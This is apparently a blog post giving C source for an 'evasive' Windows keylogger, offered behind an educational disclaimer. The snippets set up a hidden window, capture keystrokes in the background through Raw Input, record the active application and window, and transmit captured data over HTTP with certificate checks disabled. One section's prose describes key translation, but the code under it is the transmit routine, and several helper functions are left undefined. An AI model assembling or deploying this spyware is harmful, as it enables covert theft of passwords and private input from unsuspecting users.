---
title: "Constructing an evasive keylogger for security research"
date: 2026-01-23
categories: [Malware]
tags: [C, Malware, Engineering, WinAPI, Windows]
image: "https://i.pinimg.com/736x/6d/e0/32/6de0326357869cf8a921d3fd31270e17.jpg"
---
⚠️ **Disclaimer | Educational Purpose Only**
>
> This content is provided **strictly for educational and research purposes**.
>  
> All techniques, concepts, and examples discussed in this post are intended to support the study of **information security, malware analysis, and defensive research** in controlled and legal environments.
>
> The author does **not encourage, support, or condone** the use of this material for malicious, illegal, or unethical activities.
>
> Any actions taken based on the information presented here are the **sole responsibility of the reader**.
>
> Always ensure that your research and experiments comply with **local laws, ethical guidelines, and institutional policies**.

## Introduction
In this post, I will present concepts related to malware development, where we will build an evasive and efficient keylogger from scratch in pure C, using Windows APIs and various related concepts. At the end, there will be an access link to a demonstration video of the project in operation.
The project implements a mechanism for capturing user input events on Windows systems, and I also implemented a function within the component to remotely transmit the collected data. 

## Initialization Structure
### System Singleton Mechanism
```c 
HANDLE hSingleton = CreateMutexW(NULL, FALSE, L"Global\\SystemInstanceLock");
if (GetLastError() == ERROR_ALREADY_EXISTS) {
    return 0;
}
```
As is standard in projects of this type, I started by creating a singleton mechanism through the creation of a named global mutex (Global\\SystemInstanceLock), using the function [CreateMutexW](https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-createmutexw), basically, this approach prevents our malware from breaking, since the creation of a mutex avoids two payloads from running at the same time. When attempting to create the mutex, the code checks the value returned by GetLastError(). If the error is ERROR_ALREADY_EXISTS, it means that another instance has already created the mutex, indicating that the program is already running.

### Visible Graphical Environment Configuration
```c
WNDCLASSEXW WindowConfig = { 0 };
WindowConfig.cbSize = sizeof(WindowConfig);
WindowConfig.lpfnWndProc = EventHandler;
WindowConfig.hInstance = GetModuleHandleW(NULL);
WindowConfig.lpszClassName = L"SystemEventClass";
```
This technique allows the system to receive Windows events without presenting a visible graphical interface to the user. Here, a window class is registered with the system through the WNDCLASSEXW structure, which encapsulates all the information required to create a window within the Windows graphical subsystem. GetModuleHandleW(NULL) binds the window class to the currently executing module, while the lpszClassName identifier defines a unique name for the class, allowing it to be instantiated later.

## Input capture system
### Input device registration

```c
RAWINPUTDEVICE InputDevice = { 0 };
InputDevice.usUsagePage = 0x01;
InputDevice.usUsage = 0x06;
InputDevice.dwFlags = RIDEV_INPUTSINK;
InputDevice.hwndTarget = WindowHandle;
RegisterRawInputDevices(&InputDevice, 1, sizeof(RAWINPUTDEVICE));
```
The project uses the Windows Raw Input API to register input events directly from hardware devices, allowing access to keyboard data at a lower level than traditional high-level message-based mechanisms. The RAWINPUTDEVICE structure is configured to specify the type of device being monitored.
The field usUsagePage = 0x01 indicates the Generic Desktop Controls usage page, while usUsage = 0x06 specifically identifies keyboard-type devices. This combination ensures that only relevant events are forwarded to the system, and the RIDEV_INPUTSINK flag instructs the operating system to route input events to the associated window (hwndTarget), regardless of whether the application is in the foreground or not.

### System message handler
```c
LRESULT CALLBACK EventHandler(HWND hWindow, UINT uMessage, 
                              WPARAM wParam, LPARAM lParam)
{
    switch (uMessage)
    {
        case WM_INPUT:
            // Raw input processing
            ProcessRawInput(lParam);
            return 0;
            
        case WM_DESTROY:
            PostQuitMessage(0);
            return 0;
    }
    return DefWindowProcW(hWindow, uMessage, wParam, lParam);
}
```
This is the core of the event processing system. The EventHandler callback acts as the entry point for all Windows messages, specifically filtering WM_INPUT events that contain raw input data.
The EventHandler function acts as the application’s Window Procedure, being responsible for intercepting and processing messages sent by the Windows graphical subsystem to the associated window. When the WM_INPUT message is received, it indicates that new Raw Input data has been made available by the system. At this point, the lParam parameter contains a handle to the data structure that describes the raw input event.

### Raw data extraction mechanism
```c
void ProcessRawInput(LPARAM inputParam)
{
    UINT dataSize = 0;
    
    // determine data size
    GetRawInputData((HRAWINPUT)inputParam, RID_INPUT, 
                    NULL, &dataSize, sizeof(RAWINPUTHEADER));
    
    // allocate dynamic buffer
    PRAWINPUT rawData = (PRAWINPUT)HeapAlloc(GetProcessHeap(), 
                                            HEAP_ZERO_MEMORY, dataSize);
    
    // extract full data
    GetRawInputData((HRAWINPUT)inputParam, RID_INPUT, 
                    rawData, &dataSize, sizeof(RAWINPUTHEADER));
    
    // process keyboard events only
    if (rawData->header.dwType == RIM_TYPEKEYBOARD) {
        HandleKeyEvent(rawData->data.keyboard.VKey);
    }
    
    // free resources
    HeapFree(GetProcessHeap(), 0, rawData);
}
```
Here, the function makes a call to GetRawInputData with the buffer pointer set to NULL. This step aims to dynamically determine the exact size of the data associated with the input event (dataSize). After the size is identified, dynamic memory allocation is performed on the process heap using HeapAlloc, with the HEAP_ZERO_MEMORY flag to ensure the buffer is initialized in a predictable manner. A second call to GetRawInputData then effectively extracts the complete contents of the raw event into the previously allocated buffer.
The code checks the dwType field of the header (RAWINPUTHEADER) to ensure that only keyboard-type events (RIM_TYPEKEYBOARD) are processed. This validation is essential to avoid improper handling of events originating from other devices, such as mice or generic HID devices.

### System context capture
```c
BOOL CaptureSystemContext(WCHAR* windowTitle, WCHAR* appPath, 
                          DWORD* processID)
{
    HWND activeWindow = GetForegroundWindow();
    if (!activeWindow) return FALSE;
    
    GetWindowTextW(activeWindow, windowTitle, MAX_TITLE_LENGTH);
    
    GetWindowThreadProcessId(activeWindow, processID);
    
    if (*processID > 0) {
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | 
                                     PROCESS_VM_READ, FALSE, *processID);
        if (hProcess) {
            GetModuleFileNameExW(hProcess, NULL, appPath, MAX_PATH_LENGTH);
            CloseHandle(hProcess);
            return TRUE;
        }
    }
    return FALSE;
}
```
Here, the CaptureSystemContext function is responsible for collecting contextual information about the active environment at the moment of user interaction, associating input events with the current system state. This contextualization significantly enhances the semantic value of the captured data by correlating user actions with the application and window in focus.
The process begins with a call to GetForegroundWindow, which returns the handle of the currently active window. Next, GetWindowThreadProcessId is used to retrieve the identifier of the process associated with that window.
With the processID obtained, the function attempts to open the corresponding process using OpenProcess, requesting only query and memory read permissions (PROCESS_QUERY_INFORMATION | PROCESS_VM_READ). This choice of minimal privileges reduces the failure surface and avoids excessive access. Once a process handle is acquired, GetModuleFileNameExW is used to extract the full path of the executable responsible for the active window, providing an accurate identification of the running application.

#### Context change detection
```c
void TrackContextChange(DWORD processID, const WCHAR* windowTitle)
{
    static WCHAR previousTitle[MAX_TITLE_LENGTH] = {0};
    
    if (wcsncmp(previousTitle, windowTitle, wcslen(windowTitle)) != 0) {
        wcscpy_s(previousTitle, MAX_TITLE_LENGTH, windowTitle);
        
        // Register context change
        ReportContextChange(processID, windowTitle);
    }
}
```
A change detection algorithm that monitors transitions between applications, creating logical temporal markers in the captured data stream.

## Key mapping system
```c
BOOL TransmitData(PVOID dataBuffer, ULONG dataLength)
{
    HINTERNET internetSession = NULL;
    HINTERNET connection = NULL;
    HINTERNET request = NULL;
    ULONG securityFlags = 0;
    
    // initialize HTTP session
    internetSession = InitializeHttpSession();
    
    // establish connection
    connection = EstablishConnection(internetSession);
    
    // configure secure request
    request = ConfigureSecureRequest(connection);
    
    // adjust security parameters
    ConfigureSecurityOptions(request);
    
    // transmit data
    BOOL transmissionResult = SendHttpRequest(request, dataBuffer, 
                                              dataLength);
    
    // release resources hierarchically
    CleanupResources(request, connection, internetSession);
    
    return transmissionResult;
}
```
This function is responsible for translating keyboard events into comprehensible semantic representations, converting virtual key codes (Virtual-Key Codes) into Unicode characters or symbolic identifiers for special keys. Initially, the current keyboard state is captured through a call to GetKeyboardState, filling a 256-byte array that reflects the state of all virtual keys, including modifiers such as Shift, Ctrl, and Alt. This information is essential for correctly interpreting key combinations and character variations.

### Transport Security Configuration
```c
void ConfigureSecurityOptions(HINTERNET httpRequest)
{
    ULONG securityOptions = 
        SECURITY_FLAG_IGNORE_UNKNOWN_CA | 
        SECURITY_FLAG_IGNORE_CERT_CN_INVALID | 
        SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
    
    InternetSetOptionW(httpRequest, 
                      INTERNET_OPTION_SECURITY_FLAGS, 
                      &securityOptions, 
                      sizeof(securityOptions));
}
```
### Application Lifecycle – Message Processing Loop
```c
MSG systemMessage = { 0 };
while (GetMessageW(&systemMessage, NULL, 0, 0))
{
    TranslateMessage(&systemMessage);
    DispatchMessageW(&systemMessage);
}
```
The message loop constitutes the core of a Windows application, being responsible for retrieving, translating, and dispatching messages from the thread queue. This mechanism keeps the application active and responsive, enabling asynchronous processing of system events and user input. 

## Demonstration 
<iframe width="560" height="315" src="https://www.youtube.com/embed/asr0zlh8BVY" 
title="YouTube video" frameborder="0" allowfullscreen></iframe>